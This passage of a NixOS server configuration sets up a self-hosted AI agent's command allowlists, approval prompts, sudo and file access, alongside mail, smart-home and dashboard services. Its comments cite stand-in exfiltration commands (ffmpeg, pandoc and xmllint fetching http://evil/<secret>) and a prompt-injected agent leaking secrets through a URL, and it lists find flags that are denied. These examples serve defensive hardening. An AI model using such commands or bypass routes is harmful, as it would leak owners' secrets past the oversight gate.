            # exec-wrappers that would smuggle an unblessed command past the gate
            # (env/timeout/nohup/nice/stdbuf/setsid/tee/xargs), in-place code
            # editors (sed/awk -i), and the network tools (curl/wget) — those keep
            # raising the Telegram approval prompt.
            "mkdir" "rmdir" "touch" "cp" "mv" "ln" "mktemp" "truncate"
            "rm" "unlink" "shred" "dd" "chmod" "chgrp" "chown"
            # File discovery. `find` is whole-binary blessed but CONSTRAINED by
            # the safeBinProfiles.find guard below (its mutating/exec predicates
            # are denied), so `find . -type f` reads unprompted while
            # `find . -delete` / `-exec` still MISS and raise the approval prompt.
            "find"
            # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
            # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
            # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
            # blessed BARE (a bare invocation still prompts). Instead they are
            # blessed only in the NETWORK-ISOLATED `offline <tool>` form via
            # exec.netIsolatedBins below, which runs them unprompted but inside a
            # no-network namespace where those URL fetches simply cannot connect.
          ];
          # Pre-seeded full-command-line globs (merged with eva's own runtime
          # additions). These bless read-only SUBCOMMANDS of tools too dangerous
          # to whole-binary allowlist — only forms that cannot mutate. eva works
          # in git repos and inspects services/logs/nix, so pre-blessing these
          # keeps routine reads unprompted; anything else still MISSES and raises
          # the inline Telegram approve/deny prompt (now that the native runtime
          # makes that gate live). She can widen coverage for a SPECIFIC
          # invocation at runtime without a rebuild via `openclaw approvals
          # allowlist add "<glob>"` (per-agent state, not re-seeded here).
          allowlist = [
            # git — read-only porcelain/plumbing.
            "git status*" "git log*" "git diff*" "git show*" "git blame*"
            "git rev-parse*" "git describe*" "git ls-files*" "git shortlog*"
            "git reflog*" "git cat-file*" "git branch --list*" "git remote -v"
            "git config --get*" "git config --list*"
            # git — LOCAL write subcommands. The remote is the security boundary,
            # so committing/branching/staging/rewriting local history is blessed,
            # but every network-touching verb is DELIBERATELY absent and keeps
            # prompting: push, pull, fetch, clone, remote (add/set-url), submodule
            # (can fetch), ls-remote. eva can commit freely; publishing always
            # goes through the approval gate.
            "git add*" "git commit*" "git restore*" "git checkout*"
            "git switch*" "git stash*" "git reset*" "git mv*" "git rm*"
            "git merge*" "git rebase*" "git cherry-pick*" "git revert*"
            "git tag*" "git branch*" "git clean*" "git notes*"
            "git worktree*" "git apply*" "git am*"
            # systemctl — inspection subcommands (status/show/list/is-* never
            # mutate). Restart/stop/start still go through her gated sudo grant.
            "systemctl status*" "systemctl show*" "systemctl cat*"
            "systemctl list-units*" "systemctl list-timers*"
            "systemctl list-unit-files*" "systemctl is-active*"
            "systemctl is-enabled*" "systemctl is-failed*"
            "systemctl --user status*" "systemctl --user list-units*"
            # nix — read-only query subcommands (no build/gc/store mutation).
            "nix eval*" "nix flake metadata*" "nix flake show*" "nix search*"
            "nix path-info*" "nix store ls*" "nix-instantiate --parse*"
            "nixos-version*"
          ];
          # git push (and every other remote verb) is simply NOT in the allowlist
          # above, so it misses and prompts every time — the remote is the
          # boundary. No denylist needed; absence is the gate.
          # Constrain the whole-binary `find` grant to read-only traversal: deny
          # every predicate that mutates the filesystem or executes a program, so
          # the agent can search unprompted but cannot turn find into an ungated
          # delete/exec primitive. Any find command carrying one of these still
          # MISSES and raises the inline approval prompt.
          safeBinProfiles.find.deniedFlags = [
            "-delete" "-exec" "-execdir" "-ok" "-okdir"
            "-fls" "-fprint" "-fprintf" "-fprint0"
          ];
          # Network-capable converters: blessed ONLY in the `offline <tool>` form
          # (module ships the `offline` unshare-net launcher and seeds
          # `offline ffmpeg*` etc. into the allowlist). `offline ffmpeg …` runs
          # unprompted but with no network, so it can't be turned into an exfil
          # fetch; the bare tools stay gated.
          netIsolatedBins = [ "ffmpeg" "ffprobe" "pandoc" "xmllint" ];
        };
        settings.tools.fs.workspaceOnly = false; # filesystem tools beyond the workspace (ACL-granted paths)
        # NB: do NOT set channels.telegram.attachmentRoots — that key exists ONLY
        # under channels.imessage, so putting it on the telegram channel tripped
        # the strict schema ("channels.telegram: must NOT have additional
        # properties") and crash-looped the config seed, taking eva down (fixed
        # 2026-07-27). It was an attempt to fix a "media folder restriction" on
        # outbound attachments, but the key doesn't exist for telegram. If eva
        # genuinely can't attach files from her workspace, revisit with a key
        # that actually validates for this channel — it is NOT an exfil concern,
        # since the DM is locked to the single owner ID.
        # Exec approval prompts: make Telegram a NATIVE approval client so a
        # missed command raises an inline approve/deny prompt in the owner DM
        # (tap to allow-once / allow-always / deny) instead of blocking silently
        # until the CLI no-output watchdog kills the turn ("Something went wrong").
        # This is `channels.telegram.execApprovals`. The generic `approvals.exec.*`
        # forwarding pipeline is a DIFFERENT mechanism (relays a text `/approve
        # <id>` to *other* destinations) and does NOT render the native DM prompt —
        # setting it (even enabled=true, mode=session) delivered nothing, which is
        # why misses just hung. `approvers` auto-resolves from commands.ownerAllowFrom,
        # which ExecStartPre already patches with the owner's numeric ID from the
        # SOPS secret — so no plaintext ID is needed in the repo.
        settings.channels.telegram.execApprovals.enabled = true;
        settings.channels.telegram.execApprovals.target = "dm";
        # The inline tap-to-approve keyboard only renders if inline buttons are
        # allowed on the DM surface (enum: off|dm|group|all|allowlist). The prior
        # "allowlist" value was ambiguous for approvals; "dm" allows it explicitly.
        settings.channels.telegram.capabilities.inlineButtons = "dm";
        # Reply delivery: send each reply as ONE finished message, not streamed.
        # OpenClaw's default streams the reply in "block" mode — repeatedly editing
        # a growing Telegram message as tokens arrive, which is chatty and jitters
        # on mobile. "off" (enum: off|partial|block|progress) buffers the turn and
        # posts the complete reply once.
        settings.channels.telegram.streaming.mode = "off";

        # Web access: DISABLED as a data-exfiltration guard. web_fetch runs
        # OUTSIDE the exec allowlist and its destination cannot be constrained the
        # way an email recipient can — a prompt-injected agent could GET
        # https://evil/?secret=… and leak data in the URL with no gate. Email is
        # the only outbound channel we allow unprompted precisely because the
        # recipient IS constrainable (see my.openclaw.mail). If eva ever needs to
        # read the web, add it back as a gated/constrained capability, not this
        # ungated fetch. (The DuckDuckGo search plugin is likewise off.)
        settings.tools.web.fetch.enabled = false;

        # Text-to-speech via ElevenLabs, through the module's tts options. The
        # CAPABILITY stays on (enable = true) so eva can generate audio on demand
        # — when you ask her to, or when she chooses to speak — but auto = "off"
        # means she NEVER auto-converts a reply to voice. (Was "inbound", which
        # spoke back to every voice message; that's the behavior we didn't want.)
        # The multilingual model handles Spanish; the caps bound an on-demand
        # synthesis so a huge text can't spawn a giant/slow clip. The
        # ELEVENLABS_API_KEY reaches the service via the SOPS-rendered
        # EnvironmentFile below.
        tts = {
          enable = true;
          provider = "elevenlabs";
          voiceId = "dNjJKg63Fr5AXwIdkATa";
          modelId = "eleven_multilingual_v2";
          label = "Eva (español)";
          speed = 1.1;
          auto = "off";
          mode = "final";
          maxTextLength = 800;
          timeoutMs = 15000;
        };

        # Inbound speech-to-text: local whisper.cpp so eva understands voice
        # notes (the claude-cli runtime can't ingest audio itself). The
        # multilingual "small" GGML model balances Spanish accuracy against CPU
        # speed; on this 16-core box a short clip transcribes in a few seconds.
        # The model is fetched here with a pinned hash and handed to the module;
        # language stays "auto" (module default) to handle a Spanish/English mix.
        stt = {
          enable = true;
          model = pkgs.fetchurl {
            url = "https://huggingface.co/ggerganov/whisper.cpp/resolve/main/ggml-small.bin";
            hash = "sha256-G+OpsgY4Z7k35k4ux0gzZKeZF+FX+pjF2UtcH//qmHs=";
          };
        };

        # Passwordless sudo for host, service and power management. Bare paths,
        # so any arguments are allowed — a broad grant (an injected agent could
        # rebuild the system, stop any unit, or power off the box); deliberate,
        # not least privilege. Paths are the NixOS profile symlinks `sudo`
        # resolves. This is the single source of truth for eva's sudo access —
        # it used to live as a standalone security.sudo.extraRules block in
        # settings.nix.
        sudoCommands = [
          "/run/current-system/sw/bin/nixos-rebuild"
          "/run/current-system/sw/bin/systemctl"
          "/run/current-system/sw/bin/shutdown"
          "/run/current-system/sw/bin/reboot"
          "/run/current-system/sw/bin/journalctl"
        ];

        # Eva's ONLY grant into alex's tree is write access to the acpuchades-site
        # repo (she maintains it). Everything else is deliberately dropped: no
        # nix-config (she can't tamper with the tracked flake ahead of a gated
        # `sudo nixos-rebuild`), no pals project, and NO /home/alex traversal at
        # all — so she can neither reach nor list anything of alex's except this
        # one repo. The X (execute-only) entries on the private parents grant
        # search-to-reach, NOT listing (r), so their other contents stay hidden;
        # /srv/encrypted/alex{,/projects} are 0710, so without them eva couldn't
        # descend to the repo. Reached via its REAL path (/home/alex/GitHub is an
        # alex-only symlink she can no longer follow, since /home/alex is unlisted).
        #
        # This confines eva's writable surface to: her own tree (/home/eva,
        # /var/lib/openclaw), world-writable /tmp, and this one git-backed repo —
        # which is what keeps the "full local mutation" exec allowlist below safe.
        #
        # NB: changing this stops RE-APPLYING dropped ACLs on switch but does NOT
        # revoke entries already set (the grant is add-only). Clear the dropped
        # ones by hand on the live host, then verify with getfacl (do NOT touch
        # the /srv parents or acpuchades-site — those are still granted):
        #   sudo setfacl -R -x u:eva,d:u:eva \
        #     /home/alex/nix-config \
        #     /srv/encrypted/alex/projects/pals-novartis-extant
        #   sudo setfacl -x u:eva /home/alex
        access = {
          "/srv/encrypted/alex" = { permissions = "X"; };
          "/srv/encrypted/alex/projects" = { permissions = "X"; };
          "/srv/encrypted/alex/projects/acpuchades-site" = {
            permissions = "rwX";
            recursive = true;
            defaultAcl = true;
          };
        };
      };

      # Provider API keys reaching the service via my.openclaw.environmentFiles —
      # the token comes in from outside the module, next to the model/voice that
      # needs it. SOPS-rendered env file (openclaw/*-env), so no key is in this
      # public repo or the store:
      #   * ElevenLabs (reply TTS) — ELEVENLABS_API_KEY.
      #
      # NB: openclaw/anthropic-env (ANTHROPIC_API_KEY) is DELIBERATELY NOT here.
      # Under the claude-cli runtime (see agentRuntime above) Claude Code prefers
      # an ANTHROPIC_API_KEY in its environment over the subscription login and
      # would bill per-token — defeating the point of the subscription switch. The
      # SOPS secret/template still exist (sops.nix) so re-adding this line is all
      # it takes to restore the native runtime's API auth.
      my.openclaw.environmentFiles = [
        config.sops.templates."openclaw/elevenlabs-env".path
      ];

      # Eva's daily self-portrait is scheduled ON THE MACHINE, not here — both
      # the script (/home/eva/workspace/photos/daily_photo.sh) and its schedule
      # live in eva's home as user-owned systemd units under
      # /home/eva/.config/systemd/user/, so she can retune either without a
      # rebuild. This keeps script and schedule in ONE place (the machine),
      # matching the rest of her workspace-local tooling, instead of splitting a
      # store-pinned timer here from a home-dir script. One-time setup, as eva:
      #   loginctl enable-linger eva          # run the user timer without a login
      #   systemctl --user daemon-reload
      #   systemctl --user enable --now eva-daily-photo.timer
      # (unit files eva-daily-photo.{service,timer} live beside the script.)

      # obfs4 Tor bridge. Both ports below still need forwarding on the router,
      # same as 51820 for WireGuard.
      my.tor-bridge = {
        enable = true;
        nickname = "acpuchades";
        contactInfo = adminEmailAddress;
        bandwidth = {
          rate = "10 MBytes";
          burst = "20 MBytes";
        };
      };

      my.mail-server = {
        enable = true;
        hostname = "mail.acpuchades.com";
        origin = "acpuchades.com";
        # Public identity e.lebbot@acpuchades.com is a Cloudflare Email Routing
        # alias forwarding to eva@mail.acpuchades.com, which (mailDomain being
        # local) delivers straight to the eva system user's ~/Maildir.
        mailDomain = "mail.acpuchades.com";
        # rspamd stamps `X-Trusted-Sender: yes` on inbound mail whose From is one
        # of these AND passes DMARC (spoof-proof). eva keys "may act on this mail"
        # off that header, not the raw From. Same set as the send-trusted-mail
        # allowlist so trust is symmetric in both directions.
        trustedSenders = evaTrustedMailRecipients;
        relayHost = "[in-v3.mailjet.com]:587";
        saslPasswordFile = config.sops.templates."postfix/sasl_passwd".path;
        acmeEnvironmentFile = config.sops.templates."acme/cloudflare-env".path;
      };

      my.home-assistant = {
        enable = true;
        hostName = "home.acpuchades.com";
        allowedNetworks = privateNetworks;
        extraComponents = [
          "alexa_devices"
          "conversation"
          "hue"
          "met"
          "nut"
          "smartthings"
          "spotify"
          "stream"
        ];
        email.from = "noreply@acpuchades.com";
        email.recipient = adminEmailAddress;
      };

      my.server-stats = {
        enable = true;
        hostName = "status.acpuchades.com";
        port = 3001;
        allowedNetworks = privateNetworks;
        secretKeyFile = config.sops.secrets."grafana/secret-key".path;
        rendererTokenFile = config.sops.secrets."grafana/renderer-token".path;
        rendererAuthEnvFile = config.sops.templates."grafana/renderer-env".path;
      };

      my.web-analytics = {
        enable = true;
        hostName = "analytics.acpuchades.com";
        appSecretFile = config.sops.secrets."umami/app-secret".path;
      };

      my.service-dashboard = {
        enable = true;
        hostName = "dashboard.acpuchades.com";
        allowedNetworks = privateNetworks;
        # Tiles reference each service's own hostName option, so they track
        # renames automatically — no second copy of the addresses to drift.
        groups = [
          {
            name = "Cloud";
            services = [
              { name = "Nextcloud";   icon = "nextcloud.png";        description = "Files, calendar, contacts & notes"; href = "https://${config.my.cloud-suite.nextcloud.hostName}"; }
              { name = "Immich";      icon = "immich.png";           description = "Photo & video backup";              href = "https://${config.my.cloud-suite.immich.hostName}"; }
              { name = "Vaultwarden"; icon = "vaultwarden.png";      description = "Password manager";                  href = "https://${config.my.cloud-suite.bitwarden.hostName}"; }
              { name = "Collabora";   icon = "collabora-online.png"; description = "Online office suite";               href = "https://${config.my.cloud-suite.collabora.hostName}"; }
            ];
          }
          {
            name = "Media";
            services = [
              { name = "Jellyfin"; icon = "jellyfin.png"; description = "Movies, shows & music"; href = "https://${config.my.media-server.hostName}"; }
            ];
          }
          {
            name = "Smart Home";
            services = [
              { name = "Home Assistant"; icon = "home-assistant.png"; description = "Home automation"; href = "https://${config.my.home-assistant.hostName}"; }
            ];
          }
          {
            name = "Network";
            services = [
              { name = "AdGuard Home"; icon = "adguard-home.png"; description = "DNS filtering"; href = "https://${config.my.dns-filtering.virtualHost}"; }
              { name = "Transmission"; icon = "transmission.png"; description = "BitTorrent client"; href = "https://${config.my.transmission-server.hostName}"; }
            ];
          }
          {
            name = "Workflows & Analytics";
            services = [
              { name = "Prefect";     icon = "https://avatars.githubusercontent.com/u/39270919?s=200&v=4"; description = "Workflow orchestration"; href = "https://${config.my.prefect-server.virtualHost}"; }
              { name = "Umami";       icon = "umami.png";      description = "Web analytics";          href = "https://${config.my.web-analytics.hostName}"; }
              { name = "GPS Backend"; icon = "mdi-map-marker"; description = "Location tracking backend"; href = "https://${config.my.gps-backend.hostName}"; }
              { name = "Nominatim";   icon = "mdi-map-search"; description = "OSM geocoding & reverse geocoding"; href = "https://${config.my.geocoding.hostName}"; }
            ];
          }
          {
            name = "Monitoring";
            services = [
              { name = "Grafana"; icon = "grafana.png"; description = "Metrics & dashboards"; href = "https://${config.my.server-stats.hostName}"; }
              { name = "ntfy";    icon = "mdi-bell-ring";  description = "Push notifications";    href = "https://${config.my.push-notifications.hostName}"; }
            ];
          }
        ];
      };

      my.host-security = {
        enable = true;
        fail2ban = {
          enable = true;
          ignoreIP = privateNetworks;
        };
      };

      my.ups-monitor = {
        enable = true;
        monitorPasswordFile = config.sops.secrets."nut/monitor".path;
        network.enable = true;
      };


      my.prefect-server = {
        enable = true;
        host = "0.0.0.0";
        port = 4200;
        dataDir = "/srv/prefect";
        baseUrl = "https://prefect.acpuchades.com";
        virtualHost = "prefect.acpuchades.com";
        basicAuthFile = config.sops.templates."caddy/prefect-auth".path;
        workerPools.default.installPolicy = "if-not-present";
      };

      # Copy the NixOS configuration file and link it from the resulting system
      # (/run/current-system/configuration.nix). This is useful in case you
      # accidentally delete configuration.nix.
      # system.copySystemConfiguration = true;

      # This option defines the first version of NixOS you have installed on this particular machine,
      # and is used to maintain compatibility with application data (e.g. databases) created on older NixOS versions.
      #
      # Most users should NEVER change this value after the initial install, for any reason,
      # even if you've upgraded your system to a new NixOS release.
      #
      # This value does NOT affect the Nixpkgs version your packages and OS are pulled from,
      # so changing it will NOT upgrade your system - see https://nixos.org/manual/nixos/stable/#sec-upgrading for how
      # to actually do that.
      #
      # This value being lower than the current NixOS release does NOT mean your system is
      # out of date, out of support, or vulnerable.
      #
      # Do NOT change this value unless you have manually inspected all the changes it would make to your configuration,
      # and migrated your data accordingly.
      #
      # For more information, see `man configuration.nix` or https://nixos.org/manual/nixos/stable/options#opt-system.stateVersion .
      system.stateVersion = "25.05"; # Did you read the comment?

    };

in

nixpkgs.lib.nixosSystem {
  system = "x86_64-linux";
  modules = [

    ../../modules/r-dev/system.nix
    (import ../../modules/emacs-core/system.nix { inherit emacs-overlay; })

    configuration
    sops-nix.nixosModules.sops
    home-manager.nixosModules.home-manager
    {
      home-manager.useGlobalPkgs = true;
      home-manager.useUserPackages = true;
      home-manager.users.alex = import ../../users/alex;
      home-manager.extraSpecialArgs = { host = "homeserver"; };
      home-manager.sharedModules = [ sops-nix.homeManagerModules.sops ];

      users.users.alex.home = "/home/alex";
    }
  ];
}
